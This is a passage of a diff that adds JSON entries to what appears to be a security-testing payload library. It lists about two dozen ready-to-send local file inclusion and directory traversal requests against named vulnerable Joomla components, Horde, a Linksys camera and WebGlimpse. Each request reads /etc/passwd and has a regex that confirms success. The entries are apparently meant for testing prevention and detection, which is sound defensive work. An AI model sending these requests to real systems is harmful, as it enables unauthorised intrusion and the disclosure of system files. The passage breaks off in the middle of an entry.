+    "payload_type": "WebAttack",
+    "payload_name": "Horde/Horde Groupware - Local File Inclusion (Nuclei: CVE-2009-0932)",
+    "payload_external_id": "B8-LFI-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-0932 by pikpikcu] Horde before 3.2.4 and 3.3.3 and Horde Groupware before 1.1.5 are susceptible to local file inclusion in framework/Image/Image.php because it allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the Horde_Image driver name.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Cmimarketplace 0.1 - Local File Inclusion (Nuclei: CVE-2009-1496)",
+    "payload_external_id": "B8-LFI-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-1496 by daffainfo] Joomla! Cmimarketplace 0.1 is susceptible to local file inclusion because com_cmimarketplace allows remote attackers to list arbitrary directories via a .. (dot dot) in the viewit parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_cmimarketplace&Itemid=70&viewit=/../../../../../../etc/passwd&cid=1",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Cisco Linksys WVC54GCA 1.00R22/1.00R24 - Local File Inclusion (Nuclei: CVE-2009-1558)",
+    "payload_external_id": "B8-LFI-026",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-1558 by daffainfo] Cisco Linksys WVC54GCA 1.00R22/1.00R24 is susceptible to local file inclusion in adm/file.cgi because it allows remote attackers to read arbitrary files via a %2e. (encoded dot dot) or an absolute pathname in the next_file parameter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/adm/file.cgi?next_file=%2fetc%2fpasswd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! MooFAQ 1.0 - Local File Inclusion (Nuclei: CVE-2009-2015)",
+    "payload_external_id": "B8-LFI-027",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-2015 by daffainfo] Joomla! Ideal MooFAQ 1.0 via com_moofaq allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter (local file inclusion).",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/components/com_moofaq/includes/file_includer.php?gzip=0&file=/../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! JoomlaPraise Projectfork  2.0.10 - Local File Inclusion (Nuclei: CVE-2009-2100)",
+    "payload_external_id": "B8-LFI-028",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-2100 by daffainfo] Joomla! JoomlaPraise Projectfork (com_projectfork) 2.0.10 allows remote attackers to read arbitrary files via local file inclusion in the section parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_projectfork&section=../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Agora 3.0.0b - Local File Inclusion (Nuclei: CVE-2009-3053)",
+    "payload_external_id": "B8-LFI-029",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-3053 by daffainfo] Joomla! Agora 3.0.0b (com_agora) allows remote attackers to include and execute arbitrary local files via local file inclusion in the action parameter to the avatars page, reachable through index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_agora&task=profile&page=avatars&action=../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Roland Breedveld Album 1.14 - Local File Inclusion (Nuclei: CVE-2009-3318)",
+    "payload_external_id": "B8-LFI-030",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-3318 by daffainfo] Joomla! Roland Breedveld Album 1.14 (com_album) is susceptible to local file inclusion because it allows remote attackers to access arbitrary directories and have unspecified other impact via a .. (dot dot) in the target parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_album&Itemid=128&target=../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Omilen Photo Gallery 0.5b - Local File Inclusion (Nuclei: CVE-2009-4202)",
+    "payload_external_id": "B8-LFI-031",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-4202 by daffainfo] Joomla! Omilen Photo Gallery (com_omphotogallery) component Beta 0.5 allows remote attackers to include and execute arbitrary local files via directory traversal sequences in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_omphotogallery&controller=../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Portfolio Nexus - Remote File Inclusion (Nuclei: CVE-2009-4679)",
+    "payload_external_id": "B8-LFI-032",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-4679 by daffainfo] Joomla! Portfolio Nexus 1.5 contains a remote file inclusion vulnerability in the inertialFATE iF (com_if_nexus) component that allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_kif_nexus&controller=../../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WebGlimpse 2.18.7 - Directory Traversal (Nuclei: CVE-2009-5114)",
+    "payload_external_id": "B8-LFI-033",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2009-5114 by daffainfo] A directory traversal vulnerability in wgarcmin.cgi in WebGlimpse 2.18.7 and earlier allows remote attackers to read arbitrary files via a .. (dot dot) in the DOC parameter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_biblestudy - Local File Inclusion (Nuclei: CVE-2010-0157)",
+    "payload_external_id": "B8-LFI-034",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0157 by daffainfo] A directory traversal vulnerability in the Bible Study (com_biblestudy) component 6.1 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter in a studieslist action to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_biblestudy&id=1&view=studieslist&controller=../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component CCNewsLetter - Local File Inclusion (Nuclei: CVE-2010-0467)",
+    "payload_external_id": "B8-LFI-035",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0467 by daffainfo] A directory traversal vulnerability in the ccNewsletter (com_ccnewsletter) component 1.0.5 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter in a ccnewsletter action to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_ccnewsletter&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Jw_allVideos - Arbitrary File Retrieval (Nuclei: CVE-2010-0696)",
+    "payload_external_id": "B8-LFI-036",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0696 by daffainfo] A directory traversal vulnerability in includes/download.php in the JoomlaWorks AllVideos (Jw_allVideos) plugin 3.0 through 3.2 for Joomla! allows remote attackers to read arbitrary files via a ./../.../ (modified dot dot) in the file parameter.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/plugins/content/jw_allvideos/includes/download.php?file=../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Plugin Core Design Scriptegrator - Local File Inclusion (Nuclei: CVE-2010-0759)",
+    "payload_external_id": "B8-LFI-037",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0759 by daffainfo] A directory traversal vulnerability in plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php in the Core Design Scriptegrator plugin 1.4.1 for Joomla! allows remote attackers to read, and possibly include and execute, arbitrary files via directory traversal sequences in the files[] p...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_jvideodirect - Directory Traversal (Nuclei: CVE-2010-0942)",
+    "payload_external_id": "B8-LFI-038",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0942 by daffainfo] Directory traversal vulnerability in the jVideoDirect (com_jvideodirect) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jvideodirect&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_jashowcase - Directory Traversal (Nuclei: CVE-2010-0943)",
+    "payload_external_id": "B8-LFI-039",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0943 by daffainfo] A directory traversal vulnerability in the JA Showcase (com_jashowcase) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter in a jashowcase action to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jashowcase&view=jashowcase&controller=../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_jcollection - Directory Traversal (Nuclei: CVE-2010-0944)",
+    "payload_external_id": "B8-LFI-040",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0944 by daffainfo] A directory traversal vulnerability in the JCollection (com_jcollection) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jcollection&controller=../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_gcalendar Suite 2.1.5 - Local File Inclusion (Nuclei: CVE-2010-0972)",
+    "payload_external_id": "B8-LFI-041",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0972 by daffainfo] A directory traversal vulnerability in the GCalendar (com_gcalendar) component 2.1.5 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_gcalendar&controller=../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_cartweberp - Local File Inclusion (Nuclei: CVE-2010-0982)",
+    "payload_external_id": "B8-LFI-042",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0982 by daffainfo] A directory traversal vulnerability in the CARTwebERP (com_cartweberp) component 1.56.75 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_cartweberp&controller=../../../../../../../../etc/passwd",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_abbrev - Local File Inclusion (Nuclei: CVE-2010-0985)",
+    "payload_external_id": "B8-LFI-043",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-0985 by daffainfo] A directory traversal vulnerability in the Abbreviations Manager (com_abbrev) component 1.1 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_abbrev&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_rokdownloads - Local File Inclusion (Nuclei: CVE-2010-1056)",
+    "payload_external_id": "B8-LFI-044",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1056 by daffainfo] A directory traversal vulnerability in the RokDownloads (com_rokdownloads) component before 1.0.1 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_rokdownloads&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_communitypolls 1.5.2 - Local File Inclusion (Nuclei: CVE-2010-1081)",
+    "payload_external_id": "B8-LFI-045",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1081 by daffainfo] A directory traversal vulnerability in the Community Polls (com_communitypolls) component 1.5.2, and possibly earlier, for Core Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_communitypolls&controller=../../../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component & Plugin JE Tooltip 1.0 - Local File Inclusion (Nuclei: CVE-2010-1217)",
+    "payload_external_id": "B8-LFI-046",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1217 by daffainfo] A directory traversal vulnerability in the JE Form Creator (com_jeformcr) component for Joomla!, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via directory traversal sequences in the view parameter to index.php. NOTE -- the original researcher states that the...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jeformcr&view=../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_janews - Local File Inclusion (Nuclei: CVE-2010-1219)",
+    "payload_external_id": "B8-LFI-047",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
